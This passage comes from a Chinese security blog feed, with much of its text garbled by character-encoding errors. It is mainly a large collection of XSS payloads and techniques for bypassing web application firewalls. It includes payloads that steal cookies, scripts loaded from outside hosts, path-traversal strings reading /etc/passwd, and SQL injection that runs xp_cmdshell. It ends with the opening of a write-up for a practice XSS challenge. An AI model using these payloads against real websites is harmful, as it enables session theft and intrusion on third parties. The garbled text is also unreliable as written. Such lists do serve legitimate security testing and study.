ï¼Œæäº¤http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=â€&gt;&lt;imgsrc=x onerror=prompt(0);&gt;å¯ä»¥ä¿®æ”¹ä¸ºUTF-32ç¼–ç å½¢å¼???script?alert(1)?/script?http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80 2.4.8 ç©ºå­—èŠ‚æœ€é•¿ç”¨æ¥ç»•è¿‡mod_securityé˜²ç«å¢™ï¼Œå½¢å¼å¦‚ä¸‹ï¼š&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;ç©ºå­—èŠ‚åªé€‚ç”¨äºŽPHP 5.3.8ä»¥ä¸Šçš„ç‰ˆæœ¬ 2.4.9 è¯­æ³•BUGRFCå£°æ˜Žä¸­èŠ‚ç‚¹åç§°ä¸èƒ½æ˜¯ç©ºæ ¼ï¼Œä»¥ä¸‹çš„å½¢å¼åœ¨javascriptä¸­ä¸èƒ½è¿è¡Œ&lt;script&gt;alert(1);&lt;/script&gt;&lt;%0ascript&gt;alert(1);&lt;/script&gt;&lt;%0bscript&gt;alert(1);&lt;/script&gt;&lt;%, &lt;//, &lt;!,&lt;?å¯ä»¥è¢«è§£æžæˆ&lt;ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„payload&lt;// style=x:expression\28write(1)\29&gt; // Works upto IE7 å‚è€ƒhttp://html5sec.org/#71&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; // Worksupto IE9 å‚è€ƒhttp://html5sec.org/#115&lt;?xml-stylesheet type="text/css"?&gt;&lt;root style="x:expression(write(1))"/&gt; // Works in IE7 å‚è€ƒhttp://html5sec.org/#77&lt;%div%20style=xss:expression(prompt(1))&gt; // Works Upto IE7 2.4.10Unicodeåˆ†éš”ç¬¦[on\w+\s*]è¿™ä¸ªè§„åˆ™è¿‡æ»¤äº†æ‰€æœ‰onäº‹ä»¶ï¼Œä¸ºäº†éªŒè¯æ¯ä¸ªæµè§ˆå™¨ä¸­æœ‰æ•ˆçš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨fuzzingæ–¹æ³•æµ‹è¯•0Ã—00åˆ°0xffï¼Œç»“æžœå¦‚ä¸‹ï¼šIExplorer= [0x09,0x0B,0x0C,0x20,0x3B]Chrome = [0x09,0x20,0x28,0x2C,0x3B]Safari = [0x2C,0x3B]FireFox= [0x09,0x20,0x28,0x2C,0x3B]Opera = [0x09,0x20,0x2C,0x3B]Android = [0x09,0x20,0x28,0x2C,0x3B]x0båœ¨Mod_securityä¸­å·²ç»è¢«è¿‡æ»¤ï¼Œç»•è¿‡çš„æ–¹æ³•ï¼š&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec2.4.11ç¼ºå°‘X-frameé€‰é¡¹é€šå¸¸ä¼šè®¤ä¸ºX-frameæ˜¯ç”¨æ¥é˜²æŠ¤ç‚¹å‡»åŠ«æŒçš„é…ç½®ï¼Œå…¶å®žä¹Ÿå¯ä»¥é˜²æŠ¤ä½¿ç”¨iframeå¼•ç”¨çš„xssæ¼æ´žDocmodesIEå¼•å…¥äº†doc-modeå¾ˆé•¿æ—¶é—´ï¼Œæä¾›ç»™è€ç‰ˆæœ¬æµè§ˆå™¨çš„åŽç«¯å…¼å®¹æ€§ï¼Œæœ‰é£Žé™©ï¼Œæ”»å‡»æƒ…æ™¯æ˜¯é»‘å®¢å¯ä»¥å¼•ç”¨ä½ ç«™ç‚¹çš„æ¡†æž¶ï¼Œä»–å¯ä»¥å¼•å…¥doc-modeæ‰§è¡Œcssè¡¨è¾¾å¼expression(open(alert(1)))ä»¥ä¸‹POCå¯ä»¥æ’å…¥åˆ°IE7ä¸­&lt;html&gt; &lt;body&gt; &lt;meta http-equiv="X-UA-Compatible"content="IE=EmulateIE7" /&gt; &lt;iframesrc="https://targetwebsite.com"&gt; &lt;/body&gt; &lt;/html&gt; 2.4.12Window.nameæ¬ºéª—æƒ…æ™¯ï¼šæˆ‘ä»¬ç”¨iframeåŠ è½½ä¸€ä¸ªé¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çª—å£çš„åç§°ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥æ‰§è¡Œjavascriptä»£ç POC&lt;iframesrc=&amp;#039;http://www.target.com?foo="xss autofocus/AAAAA onfocus=location=window.name//&amp;#039;name="javascript:alert("XSS")"&gt;&lt;/iframe&gt;DOMåž‹XSSæœåŠ¡å™¨ä¸æ”¯æŒè¿‡æ»¤DOMåž‹çš„XSSï¼Œå› ä¸ºDOMåž‹XSSæ€»æ˜¯åœ¨å®¢æˆ·ç«¯æ‰§è¡Œï¼Œçœ‹ä¸€ä¸ªä¾‹å­ï¼š&lt;script&gt; vari=location.hash; document.write(i); &lt;/script&gt;åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œåå°„åž‹XSSå¯ä»¥è½¬æ¢æˆDOMåž‹XSSï¼šhttp://www.target.com/xss.php?foo=&lt;svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()ä¸Šé¢çš„POCåªåœ¨[.+éƒ½è¢«å…è®¸çš„æƒ…å†µä¸‹é€‚ç”¨ï¼Œå¯ä»¥ä½¿ç”¨location.hashæ³¨å…¥ä»»ä½•ä¸å…è®¸çš„ç¼–ç Location.hash[1] = : // Defined at the first position after the hash.Location.hash[2]= ( // Defined at the second position after the hasLocation.hash[3] = ) // Defined at third position after the hash.å¦‚æžœæœ‰å®¢æˆ·ç«¯è¿‡æ»¤å¯èƒ½ä¸é€‚ç”¨ 2.4.13ModSecurityç»•è¿‡&lt;scri%00pt&gt;confirm(0);&lt;/scri%00pt&gt;&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosecå‚è€ƒhttp://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html 2.4.14WEB KNIGHTç»•è¿‡&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;&lt;marquee/onstart=confirm(2)&gt;F5 BIG IP ASM and Palo ALTOç»•è¿‡&lt;table background="javascript:alert(1)"&gt;&lt;/table&gt; //IE6æˆ–è€…ä½Žç‰ˆæœ¬Opera â€œ/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;Dot Defenderç»•è¿‡&lt;svg/onload=prompt(1);&gt; &lt;isindex action="javas&amp;tab;cript:alert(1)" type=image&gt;&lt;marquee/onstart=confirm(2)&gt; XSS Payloadæ‚çƒ©123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(vulnerable)&lt;/script&gt;%3Cscript%3Ealert('XSS')%3C/script%3E&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;img src="javascript:alert('XSS')"&gt;%0a%0a&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;.jsp%22%3cscript%3ealert(%22xss%22)%3c/script%3e%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html%3f.jsp%3f.jsp&lt;script&gt;alert('Vulnerable');&lt;/script&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt;?sql_debug=1a%5c.aspxa.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt;a/a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt;"&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt;';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt'--&amp;&amp;%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd..\..\..\..\..\..\..\..\windows\system.ini\..\..\..\..\..\..\..\..\windows\system.ini'';!--"&lt;XSS&gt;=&amp;&#123;()&#125;&lt;IMG src="javascript:alert('XSS');"&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=JaVaScRiPt:alert('XSS')&gt;&lt;IMG src=JaVaScRiPt:alert("XSS")&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=javascript:alert('XSS')&gt;&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;IMG src="jav ascript:alert('XSS');"&gt;&lt;IMG src="jav ascript:alert('XSS');"&gt;&lt;IMG src="jav ascript:alert('XSS');"&gt;"&lt;IMG src=java\0script:alert(\"XSS\")&gt;";' &gt; out&lt;IMG src=" javascript:alert('XSS');"&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;&lt;BODY ONLOAD=alert('XSS')&gt;&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;&lt;BGSOUND src="javascript:alert('XSS');"&gt;&lt;br size="&amp;&#123;alert('XSS')&#125;"&gt;&lt;LAYER src="http://xss.ha.ckers.org/a.js"&gt;&lt;/layer&gt;&lt;LINK REL="stylesheet" href="javascript:alert('XSS');"&gt;&lt;IMG src='vbscript:msgbox("XSS")'&gt;&lt;IMG src="mocha:[code]"&gt;&lt;IMG src="livescript:[code]"&gt;&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;&lt;IFRAME src=javascript:alert('XSS')&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert('XSS')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;&lt;DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"&gt;&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;&lt;IMG STYLE='xss:expre\ssion(alert("XSS"))'&gt;&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;&lt;STYLE TYPE="text/css"&gt;.XSS&#123;background-image:url("javascript:alert('XSS')");&#125;&lt;/STYLE&gt;&lt;A class="XSS"&gt;&lt;/A&gt;&lt;STYLE type="text/css"&gt;BODY&#123;background:url("javascript:alert('XSS')")&#125;&lt;/STYLE&gt;&lt;BASE href="javascript:alert('XSS');//"&gt;getURL("javascript:alert('XSS')")a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);&lt;XML src="javascript:alert('XSS');"&gt;"&gt; &lt;BODY ONLOAD="a();"&gt;&lt;SCRIPT&gt;function a()&#123;alert('XSS');&#125;&lt;/SCRIPT&gt;&lt;"&lt;SCRIPT src="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;&lt;IMG src="javascript:alert('XSS')"&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt;&lt;IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;&lt;SCRIPT a="&gt;" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT ="&gt;" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a="&gt;" '' src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT "a='&gt;'" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt; æŒ‰æ ‡ç­¾åˆ†ç±»çš„XSS Payload12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394";alert(1);//xxÂ¼scriptÂ¾alert(Â¢XSSÂ¢)Â¼/scriptÂ¾ //US-ASCIIç¼–ç ï¼Œå¦‚Tomcat&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt; //IE7ä»¥ä¸‹&lt;![endif]--&gt;&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;a href="javascript:alert(1)"&gt;aaaa&lt;/a&gt;&lt;a href="JavaSCript:alealertrt%25281%2529"&gt;aaaa&lt;/a&gt;&lt;a onclick=alert(1)&gt;XSS&lt;/a&gt;&lt;a onmouseover=alert(1)&gt;XSS&lt;/a&gt;&lt;body onload=alert(1)&gt; //æ— éœ€jsæ ‡ç­¾ï¼Œå¯ç›´æŽ¥æ‰§è¡Œ&lt;body background="javascript:alert('XSS')"&gt; //IE7ä»¥ä¸‹&lt;DIV style="background-image: url(javascript:alert('XSS'))"&gt; //IE7ä»¥ä¸‹&lt;DIV style="width: expression(alert('XSS'));"&gt;&lt;embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always"&gt;&lt;/embed&gt; //Firefox/Chrome&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt; //Firefox/Chrome/Safari&lt;iframe src=# onmouseover="alert(document.cookie)"&gt;&lt;/iframe&gt;'"&gt;&lt;img onmouseover=alert(1)&gt; //IE&lt;img onmouseover=alert(1) src&gt; //IE&lt;img src=x onmouseover=alert(1)&gt;&lt;img src=x onerror=alert(1)&gt;&lt;img/src=x onerror=alert(1)&gt;&lt;img src=1 alt=al lang=ert onerror=top[url=1]alt+lang[/url]&gt;// ä¸‹é¢çš„imgæ ‡ç­¾éƒ½æ˜¯åœ¨IE7ä»¥ä¸‹ç‰ˆæœ¬ç”Ÿæ•ˆ&lt;img src=JaVaScRiPt:alert(1)&gt;&lt;img src=javascript:alert(String.fromCharCode(49))&gt;&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;img src=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;img src="jav ascript:alert('XSS')"&gt; &lt;!-- è¿™é‡Œç©ºæ ¼æ˜¯tab --&gt;&lt;img src="jav&amp;#x09;ascript:alert('XSS');"&gt; &lt;!-- &amp;#x09;æ˜¯tab --&gt;&lt;img src="jav&amp;#x0D;ascript:alert('XSS');"&gt; &lt;!-- &amp;#x0D;æ˜¯å›žè½¦ --&gt;&lt;img src=" &amp;#14; javascript:alert('XSS');"&gt;&lt;img DYNsrc="javascript:alert('XSS')"&gt;&lt;img LOWsrc="javascript:alert('XSS')"&gt;&lt;img src=`javascript:alert('xxxxx')`&gt;&lt;img src='vbscript:msgbox("XSS")'&gt;&lt;input type=image src=x onerror=alert(1)&gt;&lt;input type="IMAGE" src="javascript:alert('XSS');"&gt; //IE7ä»¥ä¸‹&lt;link rel="stylesheet" href="javascript:alert('XSS');"&gt; //IE7ä»¥ä¸‹ &lt;meta http-equiv="refresh" content="x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt; //Firefox&lt;script&gt;alert(1)&lt;/script&gt;&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;&lt;sCrsCrIptIpt&gt;alalertert(1)&lt;/ScRsCrIptipt&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;&lt;script&gt;window[url=0]'alert'[/url]&lt;/script&gt;&lt;script&gt;parent[url=1]'alert'[/url]&lt;/script&gt;&lt;script&gt;self[url=2]'alert'[/url]&lt;/script&gt;&lt;script&gt;top[url=3]'alert'[/url]&lt;/script&gt;&lt;script src=http://www.xss.com/1.js&gt;&lt;/script&gt;[quote]&lt;/script&gt;"&gt;'&gt;&lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt;&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;[/quote]&lt;style&gt;li&#123;list-style-image: url("javascript:alert('XSS')");&#125;&lt;/style&gt;&lt;ul&gt;&lt;li&gt;XSS&lt;/br&gt; //IE7ä»¥ä¸‹&lt;style&gt;a&#123;width:expression(alert('11'))&#125;&lt;/style&gt;&lt;a href="x"&gt;&lt;/a&gt; //IE7ä»¥ä¸‹&lt;style&gt;.xss&#123;background-image:url("javascript:alert('XSS')");&#125;&lt;/style&gt;&lt;a class=xss&gt;&lt;/a&gt; //IE7ä»¥ä¸‹&lt;style type="text/css"&gt;BODY&#123;background:url("javascript:alert('XSS')");&#125;&lt;/style&gt; //IE7ä»¥ä¸‹&lt;svg/onload=alert(1)&gt;&lt;table BACKGROUND="javascript:alert('XSS')"&gt; //IE7ä»¥ä¸‹&lt;table&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt; //IE7ä»¥ä¸‹&lt;div style="background-image: url(javascript:alert('XSS'));"&gt; //IE7ä»¥ä¸‹ MarkDown XSS Payloadæ‚çƒ©1234567891011121314151617181920212223242526272829303132[a](javascript:prompt(document.cookie))[a](j a v a s c r i p t:prompt(document.cookie))![a](javascript:prompt(document.cookie))\&lt;javascript:prompt(document.cookie)&gt;&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)[a](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)![a'"`onerror=prompt(document.cookie)](x)\[citelol]: (javascript:prompt(document.cookie))[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)[test](javascript://%0d%0aprompt(1))[test](javascript://%0d%0aprompt(1);com)[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)[clickme](vbscript:alert(document.domain))_http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABACAMAAADlCI9NAAACcFBMVEX/AAD//////f3//v7/0tL/AQH/cHD/Cwv/+/v/CQn/EBD/FRX/+Pj/ISH/PDz/6Oj/CAj/FBT/DAz/Bgb/rq7/p6f/gID/mpr/oaH/NTX/5+f/mZn/wcH/ICD/ERH/Skr/3Nz/AgL/trb/QED/z8//6+v/BAT/i4v/9fX/ZWX/x8f/aGj/ysr/8/P/UlL/8vL/T0//dXX/hIT/eXn/bGz/iIj/XV3/jo7/W1v/wMD/Hh7/+vr/t7f/1dX/HBz/zc3/nJz/4eH/Zmb/Hx//RET/Njb/jIz/f3//Ojr/w8P/Ghr/8PD/Jyf/mJj/AwP/srL/Cgr/1NT/5ub/PT3/fHz/Dw//eHj/ra3/IiL/DQ3//Pz/9/f/Ly//+fn/UFD/MTH/vb3/7Oz/pKT/1tb/2tr/jY3/6en/QkL/5OT/ubn/JSX/MjL/Kyv/Fxf/Rkb/sbH/39//iYn/q6v/qqr/Y2P/Li7/wsL/uLj/4+P/yMj/S0v/GRn/cnL/hob/l5f/s7P/Tk7/WVn/ior/09P/hYX/bW3/GBj/XFz/aWn/Q0P/vLz/KCj/kZH/5eX/U1P/Wlr/cXH/7+//Kir/r6//LS3/vr7/lpb/lZX/WFj/ODj/a2v/TU3/urr/tbX/np7/BQX/SUn/Bwf/4uL/d3f/ExP/y8v/NDT/KSn/goL/8fH/qan/paX/2Nj/HR3/4OD/VFT/Z2f/SEj/bm7/v7//RUX/Fhb/ycn/V1f/m5v/IyP/xMT/rKz/oKD/7e3/dHT/h4f/Pj7/b2//fn7/oqL/7u7/2dn/TEz/Gxv/6ur/3d3/Nzf/k5P/EhL/Dg7/o6P/UVHe/LWIAAADf0lEQVR4Xu3UY7MraRRH8b26g2Pbtn1t27Zt37Ft27Zt6yvNpPqpPp3GneSeqZo3z3r5T1XXL6nOFnc6nU6n0+l046tPruw/+Vil/C8tvfscquuuOGTPT2ZnRySwWaFQqGG8Y6j6Zzgggd0XChWLf/U1OFoQaVJ7AayUwPYALHEM6UCWBDYJbhXfHjUBOHvVqz8YABxfnDCArrED7jSAs13Px4Zo1jmA7eGEAXvXjRVQuQE4USWqp5pNoCthALePFfAQ0OcchoCGBAEPgPGiE7AiacChDfBmjjg7DVztAKRtnJsXALj/Hpiy2B9wofqW9AQAg8Bd8VOpCR02YMVEE4xli/L8AOmtQMQHsP9IGUBZedq/AWJfIez+x4KZqgDtBlbzon6A8GnonOwBXNONavlmUS2Dx8XTjcCwe1wNvGQB2gxaKhbV7Ubx3QC5bRMUuAEvA9kFzzW3TQAeVoB5cFw8zQUGPH9M4LwFgML5IpL6BHCvH0DmAD3xgIUpUJcTmy7UQHaV/bteKZ6GgGr3eAq4QQEmWlNqJ1z0BeTvgGfz4gAFsDXfUmbeAeoAF0OfuLL8C91jHnCtBchYq7YzsMsXIFkmDDsBjwBfi2o6GM9IrOshIp5mA6vc42Sg1wJMEVUJlPgDpBzWb3EAVsMOm5m7Hg5KrAjcJJ5uRn3uLAvosgBrRPUgnAgApC2HjtpRwFTneZRpqLs6Ak+Lp5lAj9+LccoCzLYPZjBA3gIGRgHj4EuxewH6JdZhKBVPM4CL7rEIiKo7kMAvILIEXplvA/bCR2JXAYMSawtkiqfaDHjNtYVfhzJJBvBGJ3zmADhv6054W71ZrBNvHZDigr0DDCcFkHeB8wog70G/2LXA+xIrh03i02Zgavx0Blo+SA5Q+yEcrVSAYvjYBhwEPrEoDZ+KX20wIe7G1ZtwTJIDyMYU+FwBeuGLpaLqg91NcqnqgQU9Yre/ETpzkwXIIKAAmRnQruboUeiVS1cHmF8pcv70bqBVkgak1tgAaYbuw9bj9kFjVN28wsJvxK9VFQDGzjVF7d9+9z1ARJIHyMxRQNo2SDn2408HBsY5njZJPcFbTomJo59H5HIAUmIDpPQXVGS0igfg7detBqptv/0ulwfIbbQB8kchVtNmiQsQUO7Qru37jpQX7WmS/6YZPXP+LPprbVgC0ul0Op1Op9Pp/gYrAa7fWhG7QQAAAABJRU5ErkJggg==);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//&lt;http://\&lt;meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\&gt;&gt;[text](http://danlec.com " [@danlec](/danlec) ")[a](javascript:this;alert(1))[a](javascript:this;alert(1&amp;#41;)[a](javascript&amp;#58this;alert(1&amp;#41;)[a](Javas&amp;#99;ript:alert(1&amp;#41;)[a](Javas%26%2399;ript:alert(1&amp;#41;)[a](javascript:alert&amp;#65534;(1&amp;#41;)[a](javascript:confirm(1)[a](javascript://www.google.com%0Aprompt(1))[a](javascript://%0d%0aconfirm(1);com)[a](javascript:window.onerror=confirm;throw%201)[a](javascript:alert(document.domain&amp;#41;)&lt;/http://&lt;?php\&gt;&lt;\h1\&gt;&lt;script:script&gt;confirm(2) å‚è€ƒxssç»•è¿‡ï¼Œpayloadå…¨é›† ä¸€äº›xssçš„pyload Me7ell]]></content>
      <categories>
        <category>Webå®‰å…¨åŸºç¡€</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSé—¯å…³ä¹‹xss.haozi.me]]></title>
    <url>%2F2019%2F02%2F15%2FXSS%E9%97%AF%E5%85%B3%E4%B9%8Bxss-haozi-me%2F</url>
    <content type="text"><![CDATA[èƒŒæ™¯è¿™é‡Œå†™ä¸‹haoziå¤§ä½¬çš„XSSé—¯å…³ç»ƒä¹ ç¬”è®°ã€‚ é¢˜ç›®ç½‘å€ä¸ºï¼šhttps://xss.haozi.me/ é¡¹ç›®åœ°å€ä¸ºï¼šhttps://github.com/haozi/xss-demo æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªè‡ªå¸¦alert(1)çš„jsåœ°å€ï¼šhttps://xss.haozi.me/j.jsã€‚ 0x00å…³é”®æºç ï¼š 123function render (input) &#123; return '&lt;div&gt;' + input + '&lt;/div&gt;'&#125; æ— ä»»ä½•è¿‡æ»¤ç›´æŽ¥å¾€divæ ‡ç­¾å†…å†™å†…å®¹ï¼Œç›´æŽ¥ä¸Špayloadå³å¯ã€‚ä¸‹é¢å°†æœ¬æ¬¡ç”¨åˆ°çš„XSS payloadå°ç»“å¦‚ä¸‹ï¼š 1234567891011121314&lt;script&gt;alert(1)&lt;/script&gt;&lt;body onload=alert(1)&gt;&lt;body/onload=alert(1)&gt;&lt;svg onload=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;img src onerror=alert(1)&gt;&lt;input type=image src onerror=alert(1)&gt;&lt;script src="https://xss.haozi.me/j.js"&gt;&lt;/script&gt;//åŠ è½½å¤–éƒ¨js&lt;input type=button onclick="alert(1)"&gt;//ç‚¹å‡»æŒ‰é’®&lt;input onmouseover=alert(1)&gt;//é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°æŒ‡å®šçš„å…ƒç´ ä¸Šæ—¶æ‰§è¡Œ&lt;input onmousemove=alert(1)&gt;//é¼ æ ‡ç§»åŠ¨æ—¶æ‰§è¡Œ......è¿˜æœ‰å…¶ä»–onmouseç³»åˆ—&lt;img src=javascript: 